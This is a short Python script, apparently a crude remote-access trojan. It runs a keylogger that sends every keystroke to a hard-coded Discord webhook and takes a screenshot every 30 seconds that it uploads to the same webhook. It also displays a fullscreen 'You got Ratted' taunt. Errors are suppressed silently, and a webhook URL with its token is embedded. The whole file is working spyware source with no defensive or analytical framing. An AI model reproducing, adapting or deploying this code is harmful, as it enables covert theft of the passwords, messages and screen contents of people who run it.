import os
import requests
import threading
import time
from pynput.keyboard import Listener
from PIL import ImageGrab
import tkinter as tk

WEBHOOK_URL = "https://discord.com/api/webhooks/1525597894802018494/19HSSoSyGoaVH_Hu4052ZOF4RfXXl3JU_J-U5qYURieCcOh5aJjAmY2mPDVXL5noIcMo"  #

def send_to_discord(content="", files=None):
    try:
        data = {"content": content}
        requests.post(WEBHOOK_URL, data=data, files=files)
    except:
        pass

def keylogger():
    def on_press(key):
        send_to_discord(str(key))
    with Listener(on_press=on_press) as l:
        l.join()

def screenshot():
    while True:
        try:
            img = ImageGrab.grab()
            img.save("screen.jpg")
            with open("screen.jpg", "rb") as f:
                send_to_discord("Screenshot:", {"file": f})
        except:
            pass
        time.sleep(30)

def show_rat_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='red')
    label = tk.Label(root, text="You got Ratted", font=("Arial", 80), fg="white", bg="red")
    label.pack(expand=True)
    root.mainloop()

if __name__ == "__main__":
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=screenshot, daemon=True).start()
    threading.Thread(target=show_rat_screen, daemon=True).start()
    while True:
        time.sleep(10)